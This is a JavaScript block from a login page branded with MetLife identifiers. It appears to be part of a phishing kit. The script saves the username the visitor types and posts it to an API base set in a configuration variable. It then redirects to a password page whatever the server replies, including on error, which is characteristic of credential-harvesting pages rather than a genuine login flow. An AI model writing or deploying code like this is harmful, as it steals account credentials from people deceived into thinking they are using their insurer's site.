  <!-- Configuration & API Integration -->
 <script>
function showMessage(message, type = 'error') {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');
  const messageIcon = document.getElementById('messageIcon');
  
  messageText.textContent = message;
  messageBox.className = 'message-container show ' + type;
  messageIcon.textContent = type === 'success' ? '✓' : '✕';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    messageBox.classList.remove('show');
  }, 5000);
}

function initPage() {
  const logo = document.getElementById('globalLogo');
  logo.src = window.APP_CONFIG.logo;
  logo.alt = window.APP_CONFIG.logoAlt;
  
  const footer = document.getElementById('globalFooter');
  const cfg = window.APP_CONFIG.footer;
  footer.innerHTML = `<b>Contact Us</b> - Call ${cfg.company} at ${cfg.phone}, Toll Free at ${cfg.phoneToll} or Email us at <a href="#">${cfg.email}</a><br><br>${cfg.copyright}`;
  
}


function nextStep() {
  const username = document.getElementById('username').value.trim();
  if (!username) {
    showMessage('Please enter your username.', 'error');
    return false;
  }
  
  const btn = document.getElementById('nextBtn');
  const originalText = btn.textContent;
  btn.disabled = true;
  btn.textContent = 'Loading...';
  
  localStorage.setItem('metlife_username', username);
  
  fetch(window.metlife_API_BASE + '/api/auth/username', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username })
  })
  .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
  .then(result => {
     window.location.href = './transactional/login-password.html';
    if (!result.ok) {
      showMessage(result.data.message || 'Username lookup failed.', 'error');
      btn.disabled = false;
      btn.textContent = originalText;
      return;
    }
    
    if (result.data.verificationId) {
      localStorage.setItem('login_verification_id', result.data.verificationId);
    }
    
   
  })
  .catch(function(err) {
    console.log('Username API error:', err);
    btn.disabled = false;
    btn.textContent = originalText;
    window.location.href = './transactional/login-password.html';
  });
  
  return false;
}

window.addEventListener('load', initPage);
</script>
